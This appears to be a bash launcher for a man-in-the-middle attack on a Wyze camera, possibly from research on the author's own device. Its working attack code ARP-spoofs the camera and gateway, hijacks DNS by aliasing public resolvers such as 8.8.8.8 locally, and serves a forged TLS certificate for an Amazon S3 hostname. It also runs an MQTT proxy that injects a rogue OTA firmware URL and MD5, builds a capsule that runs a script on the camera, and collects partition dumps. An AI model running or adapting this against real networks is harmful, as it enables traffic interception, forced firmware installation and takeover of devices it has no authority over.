#!/bin/bash
# Bring the local MITM stack up for ONE camera and prove each listener.
# Children are plain background jobs with redirected stdio: under launchd there is no controlling
# terminal, and nohup fails to detach there ("can't detach from console") and the children die.
#
# Deterministic rebuild: the scapy venv, the TLS bundle and the served tree are created here if
# absent. Everything under /tmp dies with a reboot, so nothing here may depend on a /tmp file
# existing — the forged leaf and the device cert set are rebuilt from the repo on every run.
#
#   OTA_URL=... OTA_MD5=... wyze_mitm_up.sh [CAM_MAC]
#
# The camera is addressed by MAC, not by IP: DHCP moved .4.23/.4.24 to .4.39/.4.51 and the old
# addresses are now held by other vendors' devices, so a hardcoded IP silently targets the wrong box.
set -u
PY=/opt/homebrew/bin/python3
HERE="$(cd "$(dirname "$0")" && pwd)"
CERTS="$HERE/../certs"
CAP_DIR="${CAP_DIR:-/tmp/fwserve}"
CAP_PATH="${CAP_PATH:-wuv2/upgrade/HL_CAM4/firmware/4.52.17.32.tar}"
CAM_MAC="${1:-${CAM_MAC:-80:48:2c:4b:cf:0b}}"
GW="${GW:-192.168.4.1}"
GWMAC="${GWMAC:-48:dd:0c:c9:ec:0d}"
UP="${UP:-192.168.4.160}"
THING="${THING:-80482c4bcf0b}"; DEV="${DEV:-80482C4BCF0B}"
OTA_URL="${OTA_URL:-https://s3-us-west-2.amazonaws.com/$CAP_PATH}"

norm_mac() { echo "$1" | tr A-F a-f | awk -F: '{ for (i = 1; i <= NF; i++) $i = $i + 0; print }' OFS=:; }
arp_lookup() {
  sudo -n /usr/sbin/arp -an 2>/dev/null | awk -v m="$(norm_mac "$CAM_MAC")" '
    { gsub(/[()]/, "", $2); mac = $4; n = split(mac, o, ":"); out = ""
      for (i = 1; i <= n; i++) out = out (i > 1 ? ":" : "") (o[i] + 0)
      if (out == m) { print $2; exit } }'
}

# --- prerequisites -------------------------------------------------------------------------
[ -x /tmp/sp/bin/python ] || { python3 -m venv /tmp/sp && /tmp/sp/bin/pip -q install scapy; }

# camera address: arp is the authority, and a sweep is the only way to find a moved unit
CAM=""
for _ in 1 2; do
  CAM=$(arp_lookup)
  [ -n "$CAM" ] && break
  for i in $(seq 1 254); do (ping -c1 -W 200 "192.168.4.$i" >/dev/null 2>&1) & done
  wait
done
[ -n "$CAM" ] || { echo "FATAL: camera $CAM_MAC is not on the LAN (arp empty after a sweep)"; exit 1; }

# interface + redirect address: the DNS answers point at $UP, so it must be local
IFACE="${IFACE:-$(route -n get "$CAM" 2>/dev/null | awk '/interface:/{print $2}')}"
[ -n "$IFACE" ] || { echo "FATAL: no route to $CAM"; exit 1; }
# The alias must carry the interface's own netmask. A /32 alias is treated as a host on the wire:
# the kernel ARPs for it, the ARP clone expires, and the address stops answering (measured).
MASK="${MASK:-$(ifconfig "$IFACE" | awk '/inet 192\.168\./{print $4; exit}')}"
[ -n "$MASK" ] || { echo "FATAL: cannot read the netmask of $IFACE"; exit 1; }
if ! ifconfig "$IFACE" | grep "inet $UP " | grep -q "netmask $MASK"; then
  ifconfig "$IFACE" | grep -q "inet $UP " && sudo ifconfig "$IFACE" -alias "$UP"
  sudo ifconfig "$IFACE" alias "$UP" netmask "$MASK" || { echo "FATAL: cannot alias $UP on $IFACE"; exit 1; }
fi

# device cert set: repo copy is authoritative (~/.config is not versioned and vanished once)
CERTDIR="$CERTS/iot/$DEV"
for f in cert.pem privkey.pem rootCA.crt; do
  [ -s "$CERTDIR/$f" ] || { echo "FATAL: missing $CERTDIR/$f (the proxy loops on registration without it)"; exit 1; }
done

# forged chain: leaf + intermediate + key, newline-separated (a PEM without a trailing newline
# glues the next header on and OpenSSL answers "PEM: BAD_END_LINE")
mkdir -p /tmp/ota
{ cat "$CERTS/emudhra/leaf.pem"; echo; cat "$CERTS/emudhra/ev-ca-aaa-cross.pem"; echo; cat "$CERTS/emudhra/leaf.key"; } > /tmp/ota/chain.pem
cp /tmp/ota/chain.pem /tmp/serve443.pem
{ cat "$CERTS/emudhra/leaf.pem"; echo; cat "$CERTS/emudhra/leaf.key"; } > /tmp/iot2.pem
cp "$CERTS/emudhra/leaf.key" /tmp/iot2.key

# served tree: capsule + the three IoT files + the image plane
mkdir -p "$CAP_DIR/wuv2/upgrade/HL_CAM4/firmware" "$CAP_DIR/fss" "$CAP_DIR/img"
for f in rootCA.crt cert.pem privkey.pem; do sudo cp "$CERTDIR/$f" "$CAP_DIR/fss/$f"; done
SERVED="$CAP_DIR/$CAP_PATH"
if [ ! -s "$SERVED" ]; then
  # zero-write dispatch probe: platform_upgrade never checks the exit status, so extra uptime proves
  # the script ran. A real capsule is staged by the operator; this only keeps the stack armable.
  PROBE="${PROBE:-/tmp/probe.sh}"
  [ -s "$PROBE" ] || printf '#!/bin/sh\nsleep 120\n' > "$PROBE"
  "$PY" "$HERE/build_ota_tar.py" --script "$PROBE" --out-dir /tmp/cap_probe --no-aes >/dev/null \
    && cp /tmp/cap_probe/Upgrade.tar "$SERVED"
fi
[ -s "$SERVED" ] || { echo "FATAL: no capsule at $SERVED and the build failed"; exit 1; }
MD5=$(md5 -q "$SERVED")
# the responder and the capsule must agree, or the device stops at the MD5 gate
if [ -n "${OTA_MD5:-}" ] && [ "$OTA_MD5" != "$MD5" ]; then
  # the bytes on disk are the truth; a stale env value would make the device stop at the MD5 gate
  echo "WARN: OTA_MD5=$OTA_MD5 but $SERVED is $MD5 — using the file digest"
fi
OTA_MD5="$MD5"
if [ -s "$CAP_DIR/img.bin" ]; then
  pinned=$(tar xOf "$SERVED" Upgrade/upgraderun.sh 2>/dev/null | awk -F= '/^IMG_SHA=/{print $2; exit}')
  [ -z "$pinned" ] || [ "$(shasum -a 256 "$CAP_DIR/img.bin" | cut -d' ' -f1)" = "$pinned" ] \
    || { echo "FATAL: img.bin does not match the capsule's pinned sha256"; exit 1; }
fi

sudo sysctl -w net.inet.ip.forwarding=1 >/dev/null
# stale listeners shadow new runs silently (EADDRINUSE). Another pane may hold the same ports and
# respawn them, so each port is waited on (bounded) instead of assumed free after one kill.
free_port() {
  for _ in 1 2 3 4 5 6 7 8 9 10; do
    pids=$(sudo lsof -nP -tiTCP:"$1" -sTCP:LISTEN 2>/dev/null)
    [ -z "$pids" ] && return 0
    sudo kill $pids 2>/dev/null
    sleep 0.5
  done
  return 1
}
for port in 443 8443 8883 8080 9101; do
  free_port "$port" || echo "WARN: port $port still held after 5 s"
done
sudo pkill -f 'wyze_dns_redirect.py' 2>/dev/null
sudo pkill -f 'wyze_arp_spoof.py' 2>/dev/null
# DNS is intercepted by aliasing the public resolvers the camera uses: a packet addressed to a
# local address is delivered to our :53 socket, whereas an rdr to a local address is not delivered
# on this host. The camera's own resolver list is 8.8.8.8/8.8.4.4/208.67.x/.4.1; the first three
# are covered here and answer instantly, so they win the race against the real gateway.
# Same netmask rule as $UP: a /32 alias is ARP'd on the wire and stops answering. A pre-existing
# alias with a different mask is replaced.
for ip in 8.8.8.8 8.8.4.4 208.67.220.123 208.67.222.123; do
  if ifconfig "$IFACE" | grep "inet $ip " | grep -q "netmask $MASK"; then continue; fi
  ifconfig "$IFACE" | grep -q "inet $ip " && sudo ifconfig "$IFACE" -alias "$ip"
  sudo ifconfig "$IFACE" alias "$ip" netmask "$MASK"
done

sudo "$PY" "$HERE/wyze_dns_redirect.py" "$UP" "$GW" > /tmp/dns.log 2>&1 &
sudo /tmp/sp/bin/python "$HERE/wyze_arp_spoof.py" "$CAM" "$CAM_MAC" "$GW" "$GWMAC" "$IFACE" > /tmp/arp.log 2>&1 &
# forged TLS on 443 (device API/S3) and 8443 (the alternate port the device also validated)
for port in 443 8443; do
  for attempt in 1 2 3; do
    extra=""
    [ "$port" = 443 ] && [ "${FIRMWARE_DETAIL:-0}" = 1 ] && extra="--firmware-detail"
    sudo "$PY" "$HERE/wyze_forge_serve.py" --dir "$CAP_DIR" --port "$port" \
      --cert /tmp/iot2.pem --key /tmp/iot2.key --intermediate "$CERTS/emudhra/ev-ca-aaa-cross.pem" \
      --sni s3-us-west-2.amazonaws.com $extra >> /tmp/tls.log 2>&1 &
    sleep 1
    sudo lsof -nP -tiTCP:"$port" -sTCP:LISTEN >/dev/null 2>&1 && break
    free_port "$port"
  done
done
# image + beacon plane: the capsule's installer fetches /img.bin here and the payloads beacon here
sudo "$PY" -m http.server 8080 --directory "$CAP_DIR" > /tmp/img8080.log 2>&1 &
sudo "$PY" -m http.server 9101 --directory "$CAP_DIR/img" > /tmp/img.log 2>&1 &
# the capsule streams every partition back before it writes; without a receiver it dies at step 2
sudo "$PY" "$HERE/wyze_backup_recv.py" --base-port "${PORT:-8446}" --dir /tmp/fwbackup \
  >> /tmp/ota/backup.log 2>&1 &
if [ "${FOREGROUND:-0}" = 1 ]; then
  # launchd supervises the proxy in the foreground; the listeners above are its children
  THING="$THING" D="$CERTDIR" CHAIN=/tmp/ota/chain.pem INJECT=1 OTA_URL="$OTA_URL" OTA_MD5="$OTA_MD5" \
    exec "$PY" "$HERE/wyze_mqtt_mitm.py"
fi
sudo THING="$THING" D="$CERTDIR" CHAIN=/tmp/ota/chain.pem \
  INJECT=1 OTA_URL="$OTA_URL" OTA_MD5="$OTA_MD5" \
  "$PY" "$HERE/wyze_mqtt_mitm.py" > /tmp/mqproxy.log 2>&1 &
sleep 3

down=0
for probe in "udp 53" "tcp 443" "tcp 8443" "tcp 8883" "tcp 8080" "tcp 9101"; do
  set -- $probe
  if [ "$1" = udp ]; then n=$(sudo lsof -nP -iUDP:"$2" 2>/dev/null | wc -l | tr -d ' ')
  else n=$(sudo lsof -nP -iTCP:"$2" -sTCP:LISTEN 2>/dev/null | wc -l | tr -d ' '); fi
  if [ "$n" -ge 2 ]; then printf '%-10s up\n' "$1:$2"; else printf '%-10s DOWN\n' "$1:$2"; down=1; fi
done
[ "$(ps -ef | grep -c "[w]yze_arp_spoof")" -ge 1 ] && echo "spoof      up" || { echo "spoof      DOWN"; down=1; }
echo "camera     $CAM ($CAM_MAC) on $IFACE"
echo "redirect   $UP"
echo "delta      $OTA_URL md5=$OTA_MD5"
dig @"$UP" aws-iot.wyzecam.com +short +time=2 +tries=1
exit "$down"
